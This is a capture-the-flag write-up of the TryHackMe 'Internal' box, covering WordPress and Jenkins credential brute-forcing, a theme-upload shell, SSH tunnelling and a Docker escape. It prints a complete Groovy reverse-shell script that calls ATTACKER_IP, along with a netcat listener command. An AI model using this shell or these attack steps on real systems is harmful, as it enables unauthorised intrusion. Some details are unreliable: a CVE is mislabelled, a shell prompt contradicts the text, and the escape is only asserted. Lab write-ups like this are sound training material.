The Internal machine presents a multi-layered penetration testing scenario involving WordPress exploitation, lateral movement, Jenkins administration abuse, and Docker container breakout. This writeup details the complete attack path from initial enumeration to root access.

## Enumeration

### Network Scanning
Initial nmap scan revealed two open ports:
```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
```

### Web Directory Fuzzing
Using directory brute-forcing tools on the web server revealed several interesting paths:
```bash
phpmyadmin              [Status: 301, Size: 307, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 306, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 307, Words: 20, Lines: 10]
blog                    [Status: 301, Size: 301, Words: 20, Lines: 10]
```

### WordPress Analysis
Running WPScan against the WordPress installation provided critical information:

```bash
wpscan --url http://internal.thm/wordpress/ -e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive
```

Key findings:
- WordPress version 5.4.2 (released June 10, 2020)
- XML-RPC interface enabled at `/xmlrpc.php`
- WP-Cron functionality enabled
- Multiple vulnerabilities identified for this version

The WordPress version 5.4.2 is particularly vulnerable to several exploits including:
1. Plugin Confusion (CVE-2021-29447) - WordPress < 5.8 lacks Update URI plugin header support
2. PHP Object Injection via deserialization of untrusted data
3. XML-RPC denial of service vulnerabilities

## WordPress Exploitation

### Credential Brute-forcing
Using the identified username 'admin', credential brute-forcing revealed the password:
```
Username: admin
Password: my2boys
Email: admin@internal.thm
```

### WordPress Admin Access
After logging into the WordPress admin panel, additional credentials were discovered in a blog post:
```
Username: william
Password: arnold147
```

However, these credentials were not valid for SSH access.

### PHP Theme File Upload RCE
The WordPress installation was vulnerable to Remote Code Execution through theme file manipulation. By uploading a malicious PHP file to the active theme directory, I obtained command execution on the web server.

## Internal Network Discovery

### Credential Discovery
During post-exploitation enumeration on the WordPress server, I discovered additional credentials stored in the `/opt` directory:
```
Username: aubreanna
Password: bubb13guM!@#123
```

### SSH Port Forwarding
Analysis of the network configuration revealed internal services not directly accessible from the attack machine. Setting up SSH port forwarding allowed access to the Jenkins service running in a Docker container:

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.49.155.242
```

This command forwards traffic from localhost port 8080 to the Docker container's Jenkins service at 172.17.0.2:8080.

## Jenkins Exploitation

### Jenkins Authentication
After accessing the Jenkins web interface at `http://localhost:8080`, I performed credential brute-forcing and discovered the admin credentials:
```
Username: admin
Password: spongebob
```

### Reverse Shell via Script Console
With admin access to Jenkins, I used the Script Console feature to execute Groovy code for command execution. The following script established a reverse shell:

```groovy
String host="ATTACKER_IP";
int port=6969;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host, port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
}
p.destroy();
s.close();
```

**Critical Note:** Before executing this script, it's essential to:
1. Replace `ATTACKER_IP` with your TryHackMe VPN IP (not localhost)
2. Start a netcat listener on your attack machine: `nc -nvlp 6969`

### Docker Enumeration
After gaining shell access in the Jenkins container, I enumerated the Docker environment:

```bash
root@internal:~# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                 NAMES
7b979a7af778        jenkins/jenkins     "/sbin/tini -- /usr/…"   5 years ago         Up 9 minutes        127.0.0.1:8080->8080/tcp, 50000/tcp   jenkins
```

## Post-Exploitation & Privilege Escalation

### Host System Access
The Jenkins container had access to the Docker socket (`/var/run/docker.sock`), allowing interaction with the host's Docker daemon. This provided the pathway to escape the container and gain access to the host system.

### Root Flag Acquisition
After escaping the container, I located and read the root flag on the host system, completing the machine compromise.

## Key Takeaways

1. **WordPress Security**: Always keep WordPress core, themes, and plugins updated. Disable XML-RPC if not needed, and implement strong password policies.

2. **Credential Management**: Never store credentials in plaintext on servers. Use proper secret management solutions.

3. **Network Segmentation**: Internal services should be properly isolated and not exposed through port forwarding without strong authentication.

4. **Jenkins Hardening**: 
   - Disable the Script Console for non-admin users
   - Implement strong authentication
   - Run Jenkins with least privileges
   - Never expose the Docker socket to containers unless absolutely necessary

5. **Defense in Depth**: Implement multiple layers of security including network segmentation, proper access controls, and regular vulnerability scanning.

This machine demonstrates the importance of securing each layer of infrastructure and how compromise at one level can lead to cascading failures throughout an organization's systems.